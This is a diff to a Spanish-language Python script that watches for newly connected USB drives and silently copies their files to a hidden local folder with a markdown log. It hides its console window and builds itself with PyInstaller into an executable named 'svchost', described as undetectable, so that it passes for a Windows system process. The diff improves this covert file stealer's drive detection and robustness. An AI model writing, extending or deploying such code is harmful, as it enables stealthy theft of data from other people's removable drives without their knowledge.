@@ -8,31 +8,24 @@ Ejecutar: python monitor_usb.py
 import os
 import shutil
 import time
-import win32api
-import win32gui
-import win32con
 import sys
+import ctypes
 from datetime import datetime
 from collections import defaultdict
 
 # Directorio de destino donde se guardarán los archivos copiados
 # EDITA ESTA LÍNEA CON TU RUTA DESEADA
-DESTINO = r"C:\Users\elkin\Desktop\monitorUSB\archivos"
+DESTINO = r"C:\Users\elkin\Desktop\ESPE\test"
 LOG_ARCHIVO = os.path.join(DESTINO, "reporte_usb.md")
 
 # Crear la carpeta si no existe
 if not os.path.exists(DESTINO):
-    os.makedirs(DESTINO)
-
-# Ocultar ventana de consola (si existe)
-def ocultar_consola():
-    """Oculta la ventana de consola completamente si existe"""
     try:
-        ventana = win32gui.GetForegroundWindow()
-        if ventana:
-            win32gui.ShowWindow(ventana, win32con.SW_HIDE)
-    except:
-        pass  # Sin consola, no hay nada que ocultar
+        os.makedirs(DESTINO, exist_ok=True)
+    except Exception as e:
+        print(f"[ERROR] No se pudo crear carpeta destino: {DESTINO}")
+        print(f"[ERROR] {str(e)}")
+        sys.exit(1)
 
 # Función para registrar en log silenciosamente
 def registrar_log(contenido):
@@ -41,6 +34,17 @@ def registrar_log(contenido):
         with open(LOG_ARCHIVO, 'a', encoding='utf-8') as f:
             f.write(contenido + "\n")
     except Exception:
+        pass
+
+# Ocultar ventana de consola (si existe)
+def ocultar_consola():
+    """Oculta la ventana de consola completamente usando ctypes"""
+    try:
+        # Usar ctypes para ocultar la consola de forma más limpia
+        kernel32 = ctypes.windll.kernel32
+        kernel32.SetConsoleDisplayMode(kernel32.GetStdHandle(-11), 0, None)
+    except Exception as e:
+        registrar_log(f"[INFO] No se pudo ocultar consola: {str(e)}")
         pass
 
 # Función para obtener extensión de archivo
@@ -171,29 +175,75 @@ def generar_reporte_markdown(estadisticas, ruta_usb, timestamp):
     registrar_log(reporte)
 
 # Detectar dispositivos USB silenciosamente
+def obtener_unidades_conectadas():
+    """Obtiene lista de unidades escaneando el sistema de archivos (100% silencioso)"""
+    unidades = set()
+    try:
+        # Escanear todas las letras de unidad posibles (C-Z)
+        for letra in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
+            path = f"{letra}:\\"
+            try:
+                # Verificar si la unidad existe y es accesible
+                if os.path.exists(path) and os.access(path, os.R_OK):
+                    unidades.add(path)
+            except Exception:
+                pass
+    except Exception as e:
+        registrar_log(f"[ERROR] Error obteniendo unidades: {str(e)}")
+    
+    return unidades
+
 def monitorear_dispositivos_usb():
     """Monitorea conexión de dispositivos USB silenciosamente"""
-    unidades_previas = set(win32api.GetLogicalDriveStrings().split("\000")[:-1])
-
-    while True:
-        time.sleep(1)
-        unidades_actuales = set(win32api.GetLogicalDriveStrings().split("\000")[:-1])
-        nuevas_unidades = unidades_actuales - unidades_previas
-
-        if nuevas_unidades:
-            for unidad in nuevas_unidades:
-                timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
-                
-                # Procesar USB silenciosamente
-                estadisticas = procesar_usb_silencioso(unidad)
-                
-                if estadisticas:
-                    generar_reporte_markdown(estadisticas, unidad, timestamp)
+    try:
+        registrar_log(f"\n[INICIO] Monitor USB iniciado - {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
         
-        unidades_previas = unidades_actuales
+        unidades_previas = obtener_unidades_conectadas()
+        registrar_log(f"[INFO] Unidades detectadas al inicio: {unidades_previas}")
+
+        contador_ciclos = 0
+        while True:
+            try:
+                time.sleep(5)
+                contador_ciclos += 1
+                
+                unidades_actuales = obtener_unidades_conectadas()
+                nuevas_unidades = unidades_actuales - unidades_previas
+
+                if nuevas_unidades:
+                    registrar_log(f"\n[DETECCIÓN] {len(nuevas_unidades)} nueva(s) unidad(es) detectada(s): {nuevas_unidades}")
+                    
+                    for unidad in nuevas_unidades:
+                        registrar_log(f"[PROCESANDO] Procesando unidad: {unidad}")
+                        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+                        
+                        try:
+                            # Procesar USB silenciosamente
+                            estadisticas = procesar_usb_silencioso(unidad)
+                            
+                            if estadisticas and estadisticas['total_archivos'] > 0:
+                                registrar_log(f"[COPIA EXITOSA] {estadisticas['archivos_copiados']} archivos copiados de {unidad}")
+                                generar_reporte_markdown(estadisticas, unidad, timestamp)
+                            else:
+                                registrar_log(f"[ADVERTENCIA] No se encontraron archivos en {unidad}")
+                        except Exception as e:
+                            registrar_log(f"[ERROR] Error procesando {unidad}: {str(e)}")
+                
+                unidades_previas = unidades_actuales
+                
+            except KeyboardInterrupt:
+                registrar_log(f"[PARADA] Monitor detenido por el usuario")
+                break
+            except Exception as e:
+                registrar_log(f"[ERROR] Error en ciclo de monitoreo: {str(e)}")
+                time.sleep(10)
+                
+    except Exception as e:
+        registrar_log(f"[ERROR CRÍTICO] Fallo en monitorear_dispositivos_usb: {str(e)}")
+        raise
 
 def compilar_ejecutable():
-    """Compila el script a un ejecutable .exe indetectable"""
+    """Compila el script a un ejecutable .exe 100% oculto"""
     try:
         import PyInstaller.__main__
     except ImportError:
@@ -207,7 +257,7 @@ def compilar_ejecutable():
     # Nombre del ejecutable
     nombre_exe = "svchost"
     
-    # Argumentos de PyInstaller (sin ícono personalizado para evitar problemas)
+    # Argumentos de PyInstaller (totalmente oculto sin abrir nada)
     argumentos = [
         script_principal,
         "--onefile",
@@ -217,21 +267,10 @@ def compilar_ejecutable():
         "--distpath=.",
         "--specpath=build",
         "--workpath=build",
-        "--hidden-import=win32api",
-        "--hidden-import=win32gui",
-        "--hidden-import=win32con",
+        "--noupx",
     ]
     
-    print("[*] ═" * 40)
-    print("[*] COMPILADOR - Monitor USB")
-    print("[*] ═" * 40)
-    print(f"[*] Script: {script_principal}")
-    print(f"[*] Salida: {nombre_exe}.exe")
-    print(f"[*] Icono: Genérico de Windows")
-    print("[*] Consola: Oculta completamente")
-    print("[*] Indetectabilidad: Máxima")
-    print("[*] ═" * 40)
-    print("\n[*] Compilando...")
+    print("[*] Compilando ejecutable oculto...")
     
     try:
         PyInstaller.__main__.run(argumentos)
@@ -240,21 +279,15 @@ def compilar_ejecutable():
         
         if os.path.exists(f"{nombre_exe}.exe"):
             shutil.move(f"{nombre_exe}.exe", archivo_final)
-            print("\n[✓] ═" * 40)
-            print("[✓] COMPILACIÓN EXITOSA")
-            print("[✓] ═" * 40)
+            print("[✓] Compilación exitosa")
             print(f"[✓] Archivo: {archivo_final}")
-            print(f"[✓] Nombre: {nombre_exe}.exe")
-            print("[✓] Icono: Windows system (indetectable)")
-            print("[✓] Consola: Oculta sin destello")
-            print("[✓] ═" * 40)
             return True
         else:
-            print("\n[!] Error: No se generó el ejecutable")
+            print("[!] Error: No se generó el ejecutable")
             return False
             
     except Exception as e:
-        print(f"\n[!] Error en compilación: {e}")
+        print(f"[!] Error en compilación: {e}")
         return False
 
 if __name__ == "__main__":
@@ -262,5 +295,13 @@ if __name__ == "__main__":
     if len(sys.argv) > 1 and sys.argv[1] == "--compile":
         compilar_ejecutable()
     else:
-        ocultar_consola()
-        monitorear_dispositivos_usb()
+        try:
+            ocultar_consola()
+            registrar_log("\n" + "="*60)
+            registrar_log(f"[INICIO DEL PROGRAMA] {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
+            registrar_log("="*60)
+            monitorear_dispositivos_usb()
+        except Exception as e:
+            registrar_log(f"[ERROR] Excepción no capturada: {str(e)}")
+            import traceback
+            registrar_log(traceback.format_exc())
